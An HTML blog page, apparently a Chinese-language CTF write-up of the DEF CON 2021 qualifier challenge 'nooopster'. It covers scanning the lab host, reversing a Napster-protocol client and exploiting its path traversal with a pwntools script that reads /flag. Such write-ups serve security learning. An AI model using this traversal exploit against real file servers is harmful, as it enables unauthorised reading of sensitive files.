@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-tw">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="nooopster   偵蒐階段進入內網後對 192.168.5.1 進行掃描。得到以下結果 1234567891011Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-23 06:08 CSTNmap scan report for 192.168.5.1Host is up (0.011s latency).PORT     STATE SE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="defcon ctf 2021 quals - nooopster">
+<meta property="og:url" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/index.html">
+<meta property="og:site_name" content="xiaobyeの狗窩">
+<meta property="og:description" content="nooopster   偵蒐階段進入內網後對 192.168.5.1 進行掃描。得到以下結果 1234567891011Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-23 06:08 CSTNmap scan report for 192.168.5.1Host is up (0.011s latency).PORT     STATE SE">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/BT4KL7X.png">
+<meta property="og:image" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/Z1zFFtl.png">
+<meta property="og:image" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/8tJ74WV.png">
+<meta property="og:image" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/62rKHoR.png">
+<meta property="og:image" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/Jbt611q.png">
+<meta property="article:published_time" content="2022-01-22T21:31:09.000Z">
+<meta property="article:modified_time" content="2022-01-22T23:08:19.480Z">
+<meta property="article:author" content="xiaobye">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="defcon ctf 2021 quals">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/BT4KL7X.png">
+
+<link rel="canonical" href="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-tw'
+  };
+</script>
+
+  <title>defcon ctf 2021 quals - nooopster | xiaobyeの狗窩</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xiaobyeの狗窩</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">▼(´ᴥ`)▼</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-tw">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/23/defcon-ctf-2021-quals-nooopster/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xiaobye">
+      <meta itemprop="description" content="資安路上的點點滴滴">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaobyeの狗窩">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          defcon ctf 2021 quals - nooopster
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-01-23 05:31:09 / Modified: 07:08:19" itemprop="dateCreated datePublished" datetime="2022-01-23T05:31:09+08:00">2022-01-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="nooopster"><a href="#nooopster" class="headerlink" title="nooopster"></a>nooopster</h1><p><img src="/2022/01/23/defcon-ctf-2021-quals-nooopster/BT4KL7X.png"></p>
+<p><img src="/2022/01/23/defcon-ctf-2021-quals-nooopster/Z1zFFtl.png"></p>
+<p><img src="/2022/01/23/defcon-ctf-2021-quals-nooopster/8tJ74WV.png"></p>
+<h2 id="偵蒐階段"><a href="#偵蒐階段" class="headerlink" title="偵蒐階段"></a>偵蒐階段</h2><p>進入內網後對 <strong>192.168.5.1</strong> 進行掃描。得到以下結果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 06:08 CST</span><br><span class="line">Nmap scan report for 192.168.5.1</span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">7070/tcp open  napster         MLDonkey multi-network P2P client</span><br><span class="line">8888/tcp open  sun-answerbook?</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.47 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟這兩個 port 進行互動沒得到什麼資訊，拿 <strong>napster</strong> 這個字眼跟題目很像的名字進行搜尋，發現這個 <a target="_blank" rel="noopener" href="http://nap.sourceforge.net/">client</a> ，載下來後跟 port 7070 互動，但發現沒有效果，嘗試用一樣的程式跟 port 8888 互動得到了響應。<a target="_blank" rel="noopener" href="http://nap.sourceforge.net/userguide.html">Linux Napster Client: User Guide</a> 這裡提供跟 napster server 互動的所有指令。</p>
+<p><img src="/2022/01/23/defcon-ctf-2021-quals-nooopster/62rKHoR.png"></p>
+<p>以下我執行了這些指令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有頻道</span></span><br><span class="line">/clist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 進入 chat 頻道</span></span><br><span class="line">/join <span class="comment">#chat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出 nooopster 這個用戶提供的檔案清單</span></span><br><span class="line">/browse nooopster</span><br></pre></td></tr></table></figure>
+
+<p>清單中有一個非 mp3 的檔案，載下來之後發現這是一隻 elf 格式的程式。我們開始嘗試逆它。</p>
+<p><img src="/2022/01/23/defcon-ctf-2021-quals-nooopster/Jbt611q.png"></p>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>分析整體流程可以大約分為以下幾個階段: </p>
+<ol>
+<li>連線到 127.0.0.1:8888 ， 並且檢查 napser server 上有沒有 <strong>nooopster</strong> 這個用戶，若沒有的話，以 <strong>nooopster</strong> 為用戶名登入。</li>
+<li>創建一條 thread 並且在裡面創建 data server (負責用來上傳檔案到 nooopster server 或是讓其他用戶直接下載檔案) 在 0.0.0.0:7070 監聽。<ol>
+<li>收到用戶連線後，創建一條 thread 負責處理此用戶的請求，先檢查用戶是否在下載請求的清單中，如果在的話，接者檢查要求的檔案名稱是否以字串 <strong>“\shared\“</strong> 作為開頭，若通過檢查，接者會把字串 <strong>“\shared\“</strong> 以後檔案名稱作為字串傳入 <code>open</code> 中。例如用戶要求下載 <strong>“\shared\/etc/passwd”<strong>，則最後得到的結果會是 <code>open(&quot;/etc/passwd&quot;,&quot;r&quot;)</code>。 這裡很明顯有</strong>路徑穿越的漏洞</strong>，可以利用這個漏洞去讀 **”/flag”**。</li>
+</ol>
+</li>
+<li>main thread 接者會不斷的重複傳送幾條提示用的訊息到 napster server 中的頻道 chat 中，以及接收來自 napster server 的檔案下載請求 ( 其他用戶的下載請求 )，這裡不做任何檢查，<strong>直接把用戶名加入下載請求的清單中</strong>。</li>
+</ol>
+<p>分析完後可以很明顯的發現，這是一隻根據 napster 的 protocol 實作出來的簡易 client，且帶有<strong>路徑穿越的漏洞</strong>，讓我們能夠下載任意檔案。</p>
+<h2 id="利用腳本"><a href="#利用腳本" class="headerlink" title="利用腳本"></a>利用腳本</h2><p>詳細的 protocol 細節在逆向 nooopster 這支 binary 的時候，有搜尋到對應的 <a target="_blank" rel="noopener" href="http://opennap.sourceforge.net/napster.txt">specification</a>，照著上面內容實作跟 server 互動的封包即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"></span><br><span class="line">user = <span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_nap_format</span>(<span class="params">opcode, content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p16(<span class="built_in">len</span>(content)) + p16(opcode) + content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nap_msg_send</span>(<span class="params">s, opcode, content</span>):</span></span><br><span class="line">    s.send(to_nap_format(opcode, content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nap_msg_recv</span>(<span class="params">s</span>):</span></span><br><span class="line">    tmp = s.recvn(<span class="number">4</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line">    n = u16(tmp[:<span class="number">2</span>])</span><br><span class="line">    opcode = u16(tmp[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;op&quot;</span>: opcode, <span class="string">&quot;data&quot;</span>:s.recvn(n)&#125;</span><br><span class="line"></span><br><span class="line">nap_server = remote(<span class="string">&quot;192.168.5.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 檢查 napster server 上是否有這個用戶名</span></span><br><span class="line">nap_msg_send(nap_server, <span class="number">7</span>, user.encode())</span><br><span class="line">msg = nap_msg_recv(nap_server)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登入伺服器</span></span><br><span class="line">nap_msg_send(nap_server, <span class="number">2</span>, <span class="string">f&quot;<span class="subst">&#123;user&#125;</span> test 0 \&quot;nap v0.8\&quot; 3&quot;</span>.encode())</span><br><span class="line">msg = nap_msg_recv(nap_server)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收一些伺服器資訊</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg = nap_msg_recv(nap_server)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> msg:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 請 napster server 向 nooopster 請求我們下載檔案的請求</span></span><br><span class="line">nap_msg_send(nap_server, <span class="number">203</span>, <span class="string">b&quot;nooopster \&quot;\\shared\\nooopster\&quot;&quot;</span>) </span><br><span class="line">msg = nap_msg_recv(nap_server)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">tmp = msg[<span class="string">&quot;data&quot;</span>].split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># nooopster 接受下載後 napster server 會回覆我們 nooopster&#x27;s 的 data server 的地址和端口</span></span><br><span class="line">ip = <span class="built_in">str</span>(ipaddress.IPv4Address(u32(p32(<span class="built_in">int</span>(tmp[<span class="number">1</span>])), endian = <span class="string">&quot;big&quot;</span>)))</span><br><span class="line">port = <span class="built_in">int</span>(tmp[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接觸發路徑穿越漏洞去讀取 flag</span></span><br><span class="line">data_server = remote(ip, port)</span><br><span class="line"><span class="built_in">print</span>(data_server.recv())</span><br><span class="line">target_file = <span class="string">&quot;/flag&quot;</span></span><br><span class="line">data_server.send(<span class="string">f&quot;GET<span class="subst">&#123;user&#125;</span> \&quot;\\shared\\<span class="subst">&#123;target_file&#125;</span>\&quot; 0&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data_server.recvall().decode())</span><br><span class="line">nap_server.close()</span><br><span class="line">data_server.close()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="resource"><a href="#resource" class="headerlink" title="resource"></a>resource</h1><p><a target="_blank" rel="noopener" href="http://nap.sourceforge.net/userguide.html#4.2.">Linux Napster Client: User Guide</a></p>
+<p><a target="_blank" rel="noopener" href="http://opennap.sourceforge.net/napster.txt">napster protocol</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/defcon-ctf-2021-quals/" rel="tag"># defcon ctf 2021 quals</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/22/defcon-ctf-2021-quals-mra/" rel="prev" title="defcon ctf 2021 quals - mra">
+      <i class="fa fa-chevron-left"></i> defcon ctf 2021 quals - mra
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nooopster"><span class="nav-number">1.</span> <span class="nav-text">nooopster</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%B5%E8%92%90%E9%9A%8E%E6%AE%B5"><span class="nav-number">1.1.</span> <span class="nav-text">偵蒐階段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91"><span class="nav-number">1.2.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%85%B3%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">利用腳本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#resource"><span class="nav-number">2.</span> <span class="nav-text">resource</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xiaobye</p>
+  <div class="site-description" itemprop="description">資安路上的點點滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiaobye</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
